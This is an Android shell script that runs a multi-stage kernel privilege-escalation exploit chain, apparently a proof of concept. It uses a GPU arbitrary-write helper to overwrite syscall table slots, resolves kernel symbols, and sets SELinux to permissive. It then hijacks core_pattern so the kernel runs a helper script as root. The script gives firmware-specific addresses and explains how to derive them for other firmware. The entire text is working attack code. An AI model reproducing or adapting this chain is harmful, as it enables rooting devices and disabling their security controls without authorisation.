#!/system/bin/sh
#
# Drive the full chain on the target device.
#
# Prerequisites (see README):
#   - adb shell (uid 2000, u:r:shell:s0) on your own device
#   - the two helpers built for armv7 (gpu_arb_write) and aarch64 (kfunc)
#   - pushed to /data/local/tmp, chmod 755
#
# Only ONE firmware-specific constant is needed: the address of
# kallsyms_lookup_name.  Everything else is resolved at run time through the
# kernel's own symbol table, so the PoC survives small firmware differences.
#
# The slot address below is sys_call_table + 244*8 for this firmware.
# Derive it for yours as: (address of sys_call_table) + 0x7a0, and use
# physical = virtual - 0xffffffc000000000.

set -u
D=/data/local/tmp

KLN_ADDR=${KLN_ADDR:-ffffffc00111f308}   # kallsyms_lookup_name, this firmware
SLOT_PHYS=${SLOT_PHYS:-1f6f7a0}           # sys_call_table[244] physical

say() { echo "[run] $*"; }
die() { echo "[run] FATAL: $*" >&2; exit 1; }

[ -x "$D/gpu_arb_write" ] || die "$D/gpu_arb_write missing"
[ -x "$D/kfunc" ]         || die "$D/kfunc missing"

# ---- stage 0: turn the unused syscall slots into kallsyms_lookup_name ----
say "stage 0: sys_call_table[244..259] <- kallsyms_lookup_name"
"$D/gpu_arb_write" "$SLOT_PHYS" "$KLN_ADDR" || die "gpu write failed"

# ---- stage 1: resolve what we need ----
resolve() {
    out=$("$D/kfunc" sym "$1" 2>/dev/null) || die "cannot resolve $1 (slot wrong?)"
    echo "$out" | awk -F'0x' '{print $2}' | tail -1
}

MEMCPY=$(resolve memcpy)
SELINUX_ENFORCING=$(resolve selinux_enforcing)
CORE_PATTERN=$(resolve core_pattern)
say "memcpy            = 0x$MEMCPY"
say "selinux_enforcing = 0x$SELINUX_ENFORCING"
say "core_pattern      = 0x$CORE_PATTERN"

# ---- stage 2: turn the same slots into memcpy ----
say "stage 2: sys_call_table[244..259] <- memcpy"
"$D/gpu_arb_write" "$SLOT_PHYS" "$MEMCPY" || die "gpu write failed"

# ---- stage 3: SELinux -> permissive ----
say "stage 3: selinux_enforcing = 0"
"$D/kfunc" zero "$SELINUX_ENFORCING" 4 || die "write failed"
say "getenforce -> $(getenforce 2>/dev/null)"

# ---- stage 4: point core_pattern at a root helper ----
say "stage 4: core_pattern <- |$D/roothelper.sh"
"$D/kfunc" str "$CORE_PATTERN" "|$D/roothelper.sh" || die "write failed"

# ---- stage 5: trigger a core dump; the kernel runs the helper as root ----
say "stage 5: triggering coredump"
rm -f "$D/root.log"
ulimit -c unlimited 2>/dev/null
( kill -SEGV $$ ) 2>/dev/null
sleep 2

if [ -f "$D/root.log" ]; then
    say "success - helper ran as root:"
    sed 's/^/    /' "$D/root.log"
else
    say "helper did not run (check dmesg / the core_pattern value)"
    exit 3
fi
